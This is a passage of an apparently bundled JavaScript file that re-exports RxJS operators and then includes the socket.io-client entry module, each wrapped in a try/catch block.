Object.defineProperty(exports, "combineLatestWith", { enumerable: true, get: function () { return combineLatestWith_1.combineLatestWith; } });
var concatAll_1 = require("./internal/operators/concatAll");
Object.defineProperty(exports, "concatAll", { enumerable: true, get: function () { return concatAll_1.concatAll; } });
var concatMap_1 = require("./internal/operators/concatMap");
Object.defineProperty(exports, "concatMap", { enumerable: true, get: function () { return concatMap_1.concatMap; } });
var concatMapTo_1 = require("./internal/operators/concatMapTo");
Object.defineProperty(exports, "concatMapTo", { enumerable: true, get: function () { return concatMapTo_1.concatMapTo; } });
var concatWith_1 = require("./internal/operators/concatWith");
Object.defineProperty(exports, "concatWith", { enumerable: true, get: function () { return concatWith_1.concatWith; } });
var connect_1 = require("./internal/operators/connect");
Object.defineProperty(exports, "connect", { enumerable: true, get: function () { return connect_1.connect; } });
var count_1 = require("./internal/operators/count");
Object.defineProperty(exports, "count", { enumerable: true, get: function () { return count_1.count; } });
var debounce_1 = require("./internal/operators/debounce");
Object.defineProperty(exports, "debounce", { enumerable: true, get: function () { return debounce_1.debounce; } });
var debounceTime_1 = require("./internal/operators/debounceTime");
Object.defineProperty(exports, "debounceTime", { enumerable: true, get: function () { return debounceTime_1.debounceTime; } });
var defaultIfEmpty_1 = require("./internal/operators/defaultIfEmpty");
Object.defineProperty(exports, "defaultIfEmpty", { enumerable: true, get: function () { return defaultIfEmpty_1.defaultIfEmpty; } });
var delay_1 = require("./internal/operators/delay");
Object.defineProperty(exports, "delay", { enumerable: true, get: function () { return delay_1.delay; } });
var delayWhen_1 = require("./internal/operators/delayWhen");
Object.defineProperty(exports, "delayWhen", { enumerable: true, get: function () { return delayWhen_1.delayWhen; } });
var dematerialize_1 = require("./internal/operators/dematerialize");
Object.defineProperty(exports, "dematerialize", { enumerable: true, get: function () { return dematerialize_1.dematerialize; } });
var distinct_1 = require("./internal/operators/distinct");
Object.defineProperty(exports, "distinct", { enumerable: true, get: function () { return distinct_1.distinct; } });
var distinctUntilChanged_1 = require("./internal/operators/distinctUntilChanged");
Object.defineProperty(exports, "distinctUntilChanged", { enumerable: true, get: function () { return distinctUntilChanged_1.distinctUntilChanged; } });
var distinctUntilKeyChanged_1 = require("./internal/operators/distinctUntilKeyChanged");
Object.defineProperty(exports, "distinctUntilKeyChanged", { enumerable: true, get: function () { return distinctUntilKeyChanged_1.distinctUntilKeyChanged; } });
var elementAt_1 = require("./internal/operators/elementAt");
Object.defineProperty(exports, "elementAt", { enumerable: true, get: function () { return elementAt_1.elementAt; } });
var endWith_1 = require("./internal/operators/endWith");
Object.defineProperty(exports, "endWith", { enumerable: true, get: function () { return endWith_1.endWith; } });
var every_1 = require("./internal/operators/every");
Object.defineProperty(exports, "every", { enumerable: true, get: function () { return every_1.every; } });
var exhaust_1 = require("./internal/operators/exhaust");
Object.defineProperty(exports, "exhaust", { enumerable: true, get: function () { return exhaust_1.exhaust; } });
var exhaustAll_1 = require("./internal/operators/exhaustAll");
Object.defineProperty(exports, "exhaustAll", { enumerable: true, get: function () { return exhaustAll_1.exhaustAll; } });
var exhaustMap_1 = require("./internal/operators/exhaustMap");
Object.defineProperty(exports, "exhaustMap", { enumerable: true, get: function () { return exhaustMap_1.exhaustMap; } });
var expand_1 = require("./internal/operators/expand");
Object.defineProperty(exports, "expand", { enumerable: true, get: function () { return expand_1.expand; } });
var filter_1 = require("./internal/operators/filter");
Object.defineProperty(exports, "filter", { enumerable: true, get: function () { return filter_1.filter; } });
var finalize_1 = require("./internal/operators/finalize");
Object.defineProperty(exports, "finalize", { enumerable: true, get: function () { return finalize_1.finalize; } });
var find_1 = require("./internal/operators/find");
Object.defineProperty(exports, "find", { enumerable: true, get: function () { return find_1.find; } });
var findIndex_1 = require("./internal/operators/findIndex");
Object.defineProperty(exports, "findIndex", { enumerable: true, get: function () { return findIndex_1.findIndex; } });
var first_1 = require("./internal/operators/first");
Object.defineProperty(exports, "first", { enumerable: true, get: function () { return first_1.first; } });
var groupBy_1 = require("./internal/operators/groupBy");
Object.defineProperty(exports, "groupBy", { enumerable: true, get: function () { return groupBy_1.groupBy; } });
var ignoreElements_1 = require("./internal/operators/ignoreElements");
Object.defineProperty(exports, "ignoreElements", { enumerable: true, get: function () { return ignoreElements_1.ignoreElements; } });
var isEmpty_1 = require("./internal/operators/isEmpty");
Object.defineProperty(exports, "isEmpty", { enumerable: true, get: function () { return isEmpty_1.isEmpty; } });
var last_1 = require("./internal/operators/last");
Object.defineProperty(exports, "last", { enumerable: true, get: function () { return last_1.last; } });
var map_1 = require("./internal/operators/map");
Object.defineProperty(exports, "map", { enumerable: true, get: function () { return map_1.map; } });
var mapTo_1 = require("./internal/operators/mapTo");
Object.defineProperty(exports, "mapTo", { enumerable: true, get: function () { return mapTo_1.mapTo; } });
var materialize_1 = require("./internal/operators/materialize");
Object.defineProperty(exports, "materialize", { enumerable: true, get: function () { return materialize_1.materialize; } });
var max_1 = require("./internal/operators/max");
Object.defineProperty(exports, "max", { enumerable: true, get: function () { return max_1.max; } });
var mergeAll_1 = require("./internal/operators/mergeAll");
Object.defineProperty(exports, "mergeAll", { enumerable: true, get: function () { return mergeAll_1.mergeAll; } });
var flatMap_1 = require("./internal/operators/flatMap");
Object.defineProperty(exports, "flatMap", { enumerable: true, get: function () { return flatMap_1.flatMap; } });
var mergeMap_1 = require("./internal/operators/mergeMap");
Object.defineProperty(exports, "mergeMap", { enumerable: true, get: function () { return mergeMap_1.mergeMap; } });
var mergeMapTo_1 = require("./internal/operators/mergeMapTo");
Object.defineProperty(exports, "mergeMapTo", { enumerable: true, get: function () { return mergeMapTo_1.mergeMapTo; } });
var mergeScan_1 = require("./internal/operators/mergeScan");
Object.defineProperty(exports, "mergeScan", { enumerable: true, get: function () { return mergeScan_1.mergeScan; } });
var mergeWith_1 = require("./internal/operators/mergeWith");
Object.defineProperty(exports, "mergeWith", { enumerable: true, get: function () { return mergeWith_1.mergeWith; } });
var min_1 = require("./internal/operators/min");
Object.defineProperty(exports, "min", { enumerable: true, get: function () { return min_1.min; } });
var multicast_1 = require("./internal/operators/multicast");
Object.defineProperty(exports, "multicast", { enumerable: true, get: function () { return multicast_1.multicast; } });
var observeOn_1 = require("./internal/operators/observeOn");
Object.defineProperty(exports, "observeOn", { enumerable: true, get: function () { return observeOn_1.observeOn; } });
var onErrorResumeNextWith_1 = require("./internal/operators/onErrorResumeNextWith");
Object.defineProperty(exports, "onErrorResumeNextWith", { enumerable: true, get: function () { return onErrorResumeNextWith_1.onErrorResumeNextWith; } });
var pairwise_1 = require("./internal/operators/pairwise");
Object.defineProperty(exports, "pairwise", { enumerable: true, get: function () { return pairwise_1.pairwise; } });
var pluck_1 = require("./internal/operators/pluck");
Object.defineProperty(exports, "pluck", { enumerable: true, get: function () { return pluck_1.pluck; } });
var publish_1 = require("./internal/operators/publish");
Object.defineProperty(exports, "publish", { enumerable: true, get: function () { return publish_1.publish; } });
var publishBehavior_1 = require("./internal/operators/publishBehavior");
Object.defineProperty(exports, "publishBehavior", { enumerable: true, get: function () { return publishBehavior_1.publishBehavior; } });
var publishLast_1 = require("./internal/operators/publishLast");
Object.defineProperty(exports, "publishLast", { enumerable: true, get: function () { return publishLast_1.publishLast; } });
var publishReplay_1 = require("./internal/operators/publishReplay");
Object.defineProperty(exports, "publishReplay", { enumerable: true, get: function () { return publishReplay_1.publishReplay; } });
var raceWith_1 = require("./internal/operators/raceWith");
Object.defineProperty(exports, "raceWith", { enumerable: true, get: function () { return raceWith_1.raceWith; } });
var reduce_1 = require("./internal/operators/reduce");
Object.defineProperty(exports, "reduce", { enumerable: true, get: function () { return reduce_1.reduce; } });
var repeat_1 = require("./internal/operators/repeat");
Object.defineProperty(exports, "repeat", { enumerable: true, get: function () { return repeat_1.repeat; } });
var repeatWhen_1 = require("./internal/operators/repeatWhen");
Object.defineProperty(exports, "repeatWhen", { enumerable: true, get: function () { return repeatWhen_1.repeatWhen; } });
var retry_1 = require("./internal/operators/retry");
Object.defineProperty(exports, "retry", { enumerable: true, get: function () { return retry_1.retry; } });
var retryWhen_1 = require("./internal/operators/retryWhen");
Object.defineProperty(exports, "retryWhen", { enumerable: true, get: function () { return retryWhen_1.retryWhen; } });
var refCount_1 = require("./internal/operators/refCount");
Object.defineProperty(exports, "refCount", { enumerable: true, get: function () { return refCount_1.refCount; } });
var sample_1 = require("./internal/operators/sample");
Object.defineProperty(exports, "sample", { enumerable: true, get: function () { return sample_1.sample; } });
var sampleTime_1 = require("./internal/operators/sampleTime");
Object.defineProperty(exports, "sampleTime", { enumerable: true, get: function () { return sampleTime_1.sampleTime; } });
var scan_1 = require("./internal/operators/scan");
Object.defineProperty(exports, "scan", { enumerable: true, get: function () { return scan_1.scan; } });
var sequenceEqual_1 = require("./internal/operators/sequenceEqual");
Object.defineProperty(exports, "sequenceEqual", { enumerable: true, get: function () { return sequenceEqual_1.sequenceEqual; } });
var share_1 = require("./internal/operators/share");
Object.defineProperty(exports, "share", { enumerable: true, get: function () { return share_1.share; } });
var shareReplay_1 = require("./internal/operators/shareReplay");
Object.defineProperty(exports, "shareReplay", { enumerable: true, get: function () { return shareReplay_1.shareReplay; } });
var single_1 = require("./internal/operators/single");
Object.defineProperty(exports, "single", { enumerable: true, get: function () { return single_1.single; } });
var skip_1 = require("./internal/operators/skip");
Object.defineProperty(exports, "skip", { enumerable: true, get: function () { return skip_1.skip; } });
var skipLast_1 = require("./internal/operators/skipLast");
Object.defineProperty(exports, "skipLast", { enumerable: true, get: function () { return skipLast_1.skipLast; } });
var skipUntil_1 = require("./internal/operators/skipUntil");
Object.defineProperty(exports, "skipUntil", { enumerable: true, get: function () { return skipUntil_1.skipUntil; } });
var skipWhile_1 = require("./internal/operators/skipWhile");
Object.defineProperty(exports, "skipWhile", { enumerable: true, get: function () { return skipWhile_1.skipWhile; } });
var startWith_1 = require("./internal/operators/startWith");
Object.defineProperty(exports, "startWith", { enumerable: true, get: function () { return startWith_1.startWith; } });
var subscribeOn_1 = require("./internal/operators/subscribeOn");
Object.defineProperty(exports, "subscribeOn", { enumerable: true, get: function () { return subscribeOn_1.subscribeOn; } });
var switchAll_1 = require("./internal/operators/switchAll");
Object.defineProperty(exports, "switchAll", { enumerable: true, get: function () { return switchAll_1.switchAll; } });
var switchMap_1 = require("./internal/operators/switchMap");
Object.defineProperty(exports, "switchMap", { enumerable: true, get: function () { return switchMap_1.switchMap; } });
var switchMapTo_1 = require("./internal/operators/switchMapTo");
Object.defineProperty(exports, "switchMapTo", { enumerable: true, get: function () { return switchMapTo_1.switchMapTo; } });
var switchScan_1 = require("./internal/operators/switchScan");
Object.defineProperty(exports, "switchScan", { enumerable: true, get: function () { return switchScan_1.switchScan; } });
var take_1 = require("./internal/operators/take");
Object.defineProperty(exports, "take", { enumerable: true, get: function () { return take_1.take; } });
var takeLast_1 = require("./internal/operators/takeLast");
Object.defineProperty(exports, "takeLast", { enumerable: true, get: function () { return takeLast_1.takeLast; } });
var takeUntil_1 = require("./internal/operators/takeUntil");
Object.defineProperty(exports, "takeUntil", { enumerable: true, get: function () { return takeUntil_1.takeUntil; } });
var takeWhile_1 = require("./internal/operators/takeWhile");
Object.defineProperty(exports, "takeWhile", { enumerable: true, get: function () { return takeWhile_1.takeWhile; } });
var tap_1 = require("./internal/operators/tap");
Object.defineProperty(exports, "tap", { enumerable: true, get: function () { return tap_1.tap; } });
var throttle_1 = require("./internal/operators/throttle");
Object.defineProperty(exports, "throttle", { enumerable: true, get: function () { return throttle_1.throttle; } });
var throttleTime_1 = require("./internal/operators/throttleTime");
Object.defineProperty(exports, "throttleTime", { enumerable: true, get: function () { return throttleTime_1.throttleTime; } });
var throwIfEmpty_1 = require("./internal/operators/throwIfEmpty");
Object.defineProperty(exports, "throwIfEmpty", { enumerable: true, get: function () { return throwIfEmpty_1.throwIfEmpty; } });
var timeInterval_1 = require("./internal/operators/timeInterval");
Object.defineProperty(exports, "timeInterval", { enumerable: true, get: function () { return timeInterval_1.timeInterval; } });
var timeout_2 = require("./internal/operators/timeout");
Object.defineProperty(exports, "timeout", { enumerable: true, get: function () { return timeout_2.timeout; } });
var timeoutWith_1 = require("./internal/operators/timeoutWith");
Object.defineProperty(exports, "timeoutWith", { enumerable: true, get: function () { return timeoutWith_1.timeoutWith; } });
var timestamp_1 = require("./internal/operators/timestamp");
Object.defineProperty(exports, "timestamp", { enumerable: true, get: function () { return timestamp_1.timestamp; } });
var toArray_1 = require("./internal/operators/toArray");
Object.defineProperty(exports, "toArray", { enumerable: true, get: function () { return toArray_1.toArray; } });
var window_1 = require("./internal/operators/window");
Object.defineProperty(exports, "window", { enumerable: true, get: function () { return window_1.window; } });
var windowCount_1 = require("./internal/operators/windowCount");
Object.defineProperty(exports, "windowCount", { enumerable: true, get: function () { return windowCount_1.windowCount; } });
var windowTime_1 = require("./internal/operators/windowTime");
Object.defineProperty(exports, "windowTime", { enumerable: true, get: function () { return windowTime_1.windowTime; } });
var windowToggle_1 = require("./internal/operators/windowToggle");
Object.defineProperty(exports, "windowToggle", { enumerable: true, get: function () { return windowToggle_1.windowToggle; } });
var windowWhen_1 = require("./internal/operators/windowWhen");
Object.defineProperty(exports, "windowWhen", { enumerable: true, get: function () { return windowWhen_1.windowWhen; } });
var withLatestFrom_1 = require("./internal/operators/withLatestFrom");
Object.defineProperty(exports, "withLatestFrom", { enumerable: true, get: function () { return withLatestFrom_1.withLatestFrom; } });
var zipAll_1 = require("./internal/operators/zipAll");
Object.defineProperty(exports, "zipAll", { enumerable: true, get: function () { return zipAll_1.zipAll; } });
var zipWith_1 = require("./internal/operators/zipWith");
Object.defineProperty(exports, "zipWith", { enumerable: true, get: function () { return zipWith_1.zipWith; } });
//# sourceMappingURL=index.js.map
}catch(e){}
})();

/* >>> socket.io-client (3296 bytes) <<< */
(function(){
try{
"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.WebTransport = exports.WebSocket = exports.NodeWebSocket = exports.XHR = exports.NodeXHR = exports.Fetch = exports.Socket = exports.Manager = exports.protocol = void 0;
exports.io = lookup;
exports.connect = lookup;
exports.default = lookup;
const url_js_1 = require("./url.js");
const manager_js_1 = require("./manager.js");
Object.defineProperty(exports, "Manager", { enumerable: true, get: function () { return manager_js_1.Manager; } });
const socket_js_1 = require("./socket.js");
Object.defineProperty(exports, "Socket", { enumerable: true, get: function () { return socket_js_1.Socket; } });
const debug_1 = __importDefault(require("debug")); // debug()
const debug = (0, debug_1.default)("socket.io-client"); // debug()
/**
 * Managers cache.
 */
const cache = {};
function lookup(uri, opts) {
    if (typeof uri === "object") {
        opts = uri;
        uri = undefined;
    }
    opts = opts || {};
    const parsed = (0, url_js_1.url)(uri, opts.path || "/socket.io");
    const source = parsed.source;
    const id = parsed.id;
    const path = parsed.path;
    const sameNamespace = cache[id] && path in cache[id]["nsps"];
    const newConnection = opts.forceNew ||
        opts["force new connection"] ||
        false === opts.multiplex ||
        sameNamespace;
    let io;
    if (newConnection) {
        debug("ignoring socket cache for %s", source);
        io = new manager_js_1.Manager(source, opts);
    }
    else {
        if (!cache[id]) {
            debug("new io instance for %s", source);
            cache[id] = new manager_js_1.Manager(source, opts);
        }
        io = cache[id];
    }
    if (parsed.query && !opts.query) {
        opts.query = parsed.queryKey;
    }
    return io.socket(parsed.path, opts);
}
// so that "lookup" can be used both as a function (e.g. `io(...)`) and as a
// namespace (e.g. `io.connect(...)`), for backward compatibility
Object.assign(lookup, {
    Manager: manager_js_1.Manager,
    Socket: socket_js_1.Socket,
    io: lookup,
    connect: lookup,
});
/**
 * Protocol version.
 *
 * @public
 */
var socket_io_parser_1 = require("socket.io-parser");
Object.defineProperty(exports, "protocol", { enumerable: true, get: function () { return socket_io_parser_1.protocol; } });
var engine_io_client_1 = require("engine.io-client");
Object.defineProperty(exports, "Fetch", { enumerable: true, get: function () { return engine_io_client_1.Fetch; } });
Object.defineProperty(exports, "NodeXHR", { enumerable: true, get: function () { return engine_io_client_1.NodeXHR; } });
Object.defineProperty(exports, "XHR", { enumerable: true, get: function () { return engine_io_client_1.XHR; } });
Object.defineProperty(exports, "NodeWebSocket", { enumerable: true, get: function () { return engine_io_client_1.NodeWebSocket; } });
Object.defineProperty(exports, "WebSocket", { enumerable: true, get: function () { return engine_io_client_1.WebSocket; } });
Object.defineProperty(exports, "WebTransport", { enumerable: true, get: function () { return engine_io_client_1.WebTransport; } });

module.exports = lookup;

}catch(e){}
})();

